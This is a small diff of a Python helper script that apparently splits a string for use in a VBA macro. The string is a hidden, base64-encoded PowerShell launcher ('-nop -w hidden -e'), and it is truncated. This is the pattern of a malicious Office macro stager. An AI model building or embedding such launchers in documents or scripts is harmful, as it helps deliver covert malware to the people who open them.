@@ -1,4 +1,5 @@
-#!/usr/bin/python
+#!/usr/bin/python3
+```If using VBA, use this script to break a string into correct size```
 
 str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAOgB..."
 
